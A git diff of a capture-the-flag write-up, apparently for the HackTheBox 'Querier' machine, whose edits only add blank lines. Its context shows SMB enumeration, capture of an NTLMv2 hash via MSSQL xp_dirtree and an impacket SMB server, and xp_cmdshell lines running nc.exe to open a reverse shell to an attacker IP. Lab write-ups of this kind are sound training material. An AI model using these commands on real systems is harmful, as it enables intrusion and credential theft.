@@ -107,6 +107,7 @@ The Reports share looks quite suspicious. Let's examine it:
 smbclient -N //10.129.142.102/Reports
 ```
 Note: Restart the machine and try connecting to SMB again if we get any errors while connecting. If it doesnt get better, restart the VPN connection and Kali VM as well.
+
 Inside the Reports share we found an excel file called Currency Volume Report, let's get it (Remember to use " " when a file name has spaces):
 ```shell
 smb: \> ls
@@ -166,7 +167,9 @@ ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
 ### Using SMB Share and a MSSQL Query to capture NTLMv2 Hash
 Searching for possible attack vectors we came across this post:
 https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
+
 To capture the hash, we will do the following steps.
+
 First start impacket-smbserver on Kali:
 ```shell
 impacket-smbserver -smb2support kalishare .
@@ -306,6 +309,7 @@ EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 10.10.14.206 8443 -e powershe
 xp_cmdshell powershell -c nc.exe "10.10.14.206 8443 -e /bin/sh"
 ```
 Note: If we are not getting a response on our Python server, reconnect again with impacket-mssqlclient and the commands again.
+
 After running the commands above, we will get a response on our nc listener, giving us access as querier\mssql-svc:
 
 ```shell
@@ -319,6 +323,7 @@ whoami
 querier\mssql-svc
 ```
 Somehow the machine is super unstable. So we may need to restart the machine multiple times, try again, etc. Or just try waiting patiently for the commands run on the shell.
+
 ### User Flag
 We can find the user.txt flag at the desktop of the user mssql-svc:
 
